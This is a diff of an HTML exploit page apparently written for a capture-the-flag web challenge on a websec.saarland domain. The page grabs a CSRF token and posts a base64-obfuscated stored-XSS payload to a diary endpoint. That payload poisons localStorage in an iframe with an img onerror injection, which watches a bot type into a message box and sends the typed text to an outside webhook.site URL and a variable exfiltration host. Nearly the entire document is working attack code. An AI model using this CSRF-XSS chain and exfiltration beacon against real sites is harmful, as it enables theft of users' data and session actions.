@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html>
-<head><title>Staging...</title></head>
+<head><title>Owley Exploit</title></head>
 <body>
-    <!-- 1. The Dummy Form: Many CSRF scripts look for this specifically -->
+    <!-- 1. The Dummy Form for the CSRF script -->
     <form id="csrf_target_form"></form>
 
     <script>
@@ -16,12 +16,11 @@
     <script>
         (function() {
             let attempts = 0;
-            const maxAttempts = 50; // Try for 5 seconds
+            const maxAttempts = 50; // Poll for 5 seconds
 
             const tokenHunter = setInterval(() => {
                 attempts++;
                 
-                // Look for the token anywhere on the page
                 const tokenInput = document.querySelector('input[name="csrfmiddlewaretoken"]');
                 
                 if (tokenInput && tokenInput.value) {
@@ -33,27 +32,41 @@
                     clearInterval(tokenHunter);
                     new Image().src = W + "/?step=error_timeout_no_token";
                 }
-            }, 100); // Check every 100ms
+            }, 100);
 
             function executePayload(token) {
-                // The Diary Payload (Base64 encoded to bypass filters)
-                const diaryJS = `
-                    document.domain = "owley-madison.jeopardy.websec.saarland";
-                    var f = document.createElement("iframe");
-                    f.src = "https://match.owley-madison.jeopardy.websec.saarland/";
-                    f.onload = function() {
-                        try {
-                            var payload = '</option><img src=x onerror="new Image().src=\\'https://webhook.site/6ef9bff5-8aaa-4fc4-8a76-743310ff8782/?flag=\\'+encodeURIComponent(document.getElementById(\\'message\\').value)">';
-                            f.contentWindow.localStorage.setItem("favorites", JSON.stringify([payload]));
-                            window.location.href = "https://chat.owley-madison.jeopardy.websec.saarland/";
-                        } catch(e) {
-                            new Image().src = "https://webhook.site/6ef9bff5-8aaa-4fc4-8a76-743310ff8782/?error=" + btoa(e.message);
-                        }
+                // 3. The core logic that runs inside the bot's Diary.
+                const innerJS = `
+                    document.domain='owley-madison.jeopardy.websec.saarland';
+                    new Image().src='${W}/?step=4_diary_xss_firing';
+                    
+                    var i=document.createElement('iframe');
+                    i.src='https://match.owley-madison.jeopardy.websec.saarland/';
+                    
+                    i.onload=function(){
+                        new Image().src='${W}/?step=5_iframe_ready';
+                        
+                        // THE TRAP: Waits for the bot to type the flag into the message box
+                        var trap = "var wait=setInterval(function(){" +
+                                   "  var m=parent.document.getElementById('message');" +
+                                   "  if(m && m.value.length > 5){" + 
+                                   "    new Image().src='${W}/?flag='+encodeURIComponent(m.value);" +
+                                   "    clearInterval(wait);" +
+                                   "  }" +
+                                   "}, 500);";
+
+                        var p = '</option><img src=x onerror="' + trap + '">';
+                        
+                        i.contentWindow.localStorage.setItem('favorites', JSON.stringify([p]));
+                        new Image().src='${W}/?step=6_poisoned_redirecting';
+                        window.location.href='https://chat.owley-madison.jeopardy.websec.saarland/';
                     };
-                    document.body.appendChild(f);
+                    document.body.appendChild(i);
                 `;
 
-                const finalPayload = "<script>eval(atob('" + btoa(diaryJS) + "'));<\/script>";
+                // Base64 encode innerJS to prevent any quotation mark conflicts inside the HTML attribute
+                const encodedJS = btoa(innerJS);
+                const diaryEntry = '<img src="x" onerror="eval(atob(\\'' + encodedJS + '\\'))">';
 
                 const form = document.createElement('form');
                 form.action = 'https://diary.owley-madison.jeopardy.websec.saarland/entry';
@@ -62,7 +75,7 @@
                 form.innerHTML = '<input name="content" id="c"><input name="csrfmiddlewaretoken" id="t">';
                 document.body.appendChild(form);
                 
-                document.getElementById('c').value = finalPayload;
+                document.getElementById('c').value = diaryEntry;
                 document.getElementById('t').value = token;
                 
                 new Image().src = W + "/?step=3_submitting_to_diary";
